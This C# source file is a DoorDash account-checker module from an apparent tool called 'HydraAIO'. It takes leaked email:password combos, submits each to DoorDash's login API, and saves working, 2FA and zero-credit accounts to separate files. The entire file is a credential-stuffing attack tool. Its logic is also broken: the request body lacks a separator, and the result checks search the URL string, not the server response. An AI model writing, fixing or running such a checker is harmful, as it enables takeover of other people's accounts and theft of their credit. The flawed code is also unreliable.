using HydraAIO.Hydro;
using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace HydraAIO.Modules
{
    internal class doordashmodule
    {
        public static bool Checkdoordash(string combo)
        {

            using (HttpRequest httpRequest = new HttpRequest())
            {

                string email = combo.Split(':')[0];
                string password = combo.Split(':')[1];

                string data = "email=" + email + "password=" + password;

                CookieContainer cc = new CookieContainer();
                var request2 = (HttpWebRequest)HttpWebRequest.Create("https://api.doordash.com/v2/auth/web_login/");

                var postdata = Encoding.ASCII.GetBytes(data);
                request2.Method = "Post";
                request2.ContentType = "application/x-www-form-urlencoded";
                request2.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36";

                request2.ContentLength = data.Length;

                using (var stream = request2.GetRequestStream())
                {
                    stream.Write(postdata, 0, data.Length);
                }
                var response = (HttpWebResponse)request2.GetResponse();

                string html = new StreamReader(response.GetResponseStream()).ReadToEnd();
                string api = "https://api.doordash.com/v2/auth/web_login/";

                if (api.Contains("account_credits\":(.*?),"))
                {
                    ++Program.hits;
                    ++Program.cheked;
                    Export.AsResult("/hits.txt", combo);
                    return true;
                }
                if (api.Contains("last_name"))
                {
                    ++Program.custom;
                    ++Program.cheked;
                    //Colorful.Console.WriteLine("[/] 2FA - " + combo, Color.Yellow);
                    Export.AsResult("/2FA.txt", combo);
                    return true;
                }
                if (api.Contains("account_credits\":0"))
                {
                    ++Program.custom;
                    ++Program.cheked;
                    ++Program.cpm;
                    //Colorful.Console.WriteLine("[/] 2FA - " + combo, Color.Yellow);
                    Export.AsResult("/Free.txt", combo);
                    return true;
                }
                else
                {
                    ++Program.bad;
                    ++Program.cheked;
                    //Colorful.Console.WriteLine("[-] Bad - " + combo, Color.Red);
                    return true;
                }
            }
        }
    }
}
